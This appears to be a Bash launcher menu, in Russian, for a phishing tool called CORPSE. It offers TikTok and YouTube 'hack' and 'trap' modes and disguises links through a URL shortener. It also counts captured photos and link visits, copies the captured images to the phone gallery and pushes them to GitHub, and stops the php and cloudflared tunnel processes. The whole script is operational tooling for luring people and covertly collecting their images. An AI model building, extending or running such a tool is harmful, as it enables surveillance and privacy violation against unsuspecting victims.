#!/bin/bash
while true; do
clear
echo -e "\e[1;31m      .---.
     /     \
    | () () |
     \  ^  /
      |||||
      |||||\e[0m"
echo -e "\e[1;31m  ____ ___  ____  ____  ____  _____ 
 / ___/ _ \|  _ \|  _ \/ ___|| ____|
| |  | | | | |_) | |_) \___ \|  _|  
| |__| |_| |  _ <|  __/ ___) | |___ 
 \____\___/|_| \_\_|   |____/|_____|\e[0m"
echo -e "   \e[1;33m--- СИСТЕМА ОНЛАЙН v3.8 ---\e[0m"

mkdir -p images visits
ULO_COUNT=$(ls images 2>/dev/null | grep -c .png)
VIS_COUNT=$(ls visits 2>/dev/null | wc -l)

echo -e "   \e[1;32mУЛОВ В БАЗЕ: $ULO_COUNT\e[0m"
echo -e "   \e[1;36mПЕРЕХОДОВ ПО ССЫЛКЕ: $VIS_COUNT\e[0m"
echo ""
echo -e " \e[1;37m[\e[1;31m1\e[1;37m] ТИК-ТОК       \e[1;34m*\e[1;37m Взлом через TikTok"
echo -e " \e[1;37m[\e[1;31m2\e[1;37m] ЮТУБ ШОРТС   \e[1;34m*\e[1;37m Ловушка через YouTube"
echo -e " \e[1;37m[\e[1;31m3\e[1;37m] МАСКИРОВКА   \e[1;34m*\e[1;37m Сократить через clck.ru"
echo -e " \e[1;34m------------------------------------------\e[0m"
echo -e " \e[1;37m[\e[1;32m5\e[1;37m] В ГАЛЕРЕЮ    \e[1;34m*\e[1;37m Сохранить фото в телефон"
echo -e " \e[1;37m[\e[1;32m6\e[1;37m] В GITHUB     \e[1;34m*\e[1;37m Сохранить всё в облако"
echo -e " \e[1;37m[\e[1;31m8\e[1;37m] ОЧИСТКА      \e[1;34m*\e[1;37m Удалить базу фото и посещений"
echo -e " \e[1;37m[\e[1;32mc\e[1;37m] ПРОВЕРКА СОФТА\e[1;34m*\e[1;37m Обновить дрова и туннель\e[0m"
echo -e " \e[1;37m[\e[1;31m0\e[1;37m] ВЫХОД\e[0m"
echo ""
echo -ne "\e[1;33mВЫБЕРИТЕ ПУНКТ: \e[0m"
read -n 1 choice
echo ""

case $choice in
    1|2) 
        if [ "$choice" -eq "1" ]; then ./start_tt.sh; else ./start_yt.sh; fi
        ;;
    3)
        echo -ne "\e[1;34m[*] Вставь длинную ссылку: \e[0m"
        read long_link
        echo -e "\e[1;33m[*] Сокращаю через clck.ru...\e[0m"
        short_link=$(curl -s "https://clck.ru/--?url=$long_link")
        echo -e "\e[1;32m[+] Готовая ссылка: $short_link\e[0m"
        echo "Нажми любую клавишу..."
        read -n 1
        ;;
    5) 
        termux-setup-storage
        mkdir -p /sdcard/DCIM/CORPSE
        cp images/*.png /sdcard/DCIM/CORPSE/ 2>/dev/null
        echo -e "\e[1;32mГотово! Фото в папке DCIM/CORPSE\e[0m"
        sleep 2 
        ;;
    6) git add . && git commit -m "Update: System Check added" && git push origin main ;;
    8) 
        rm -rf images/* visits/*
        echo -e "\e[1;31mБаза очищена!\e[0m"
        sleep 2 
        ;;
    c|C|9) ./check_system.sh ;;
    0) pkill -9 php && pkill -9 cloudflared && exit ;;
    *) echo -e "\nНеверный ввод" && sleep 1 ;;
esac
done
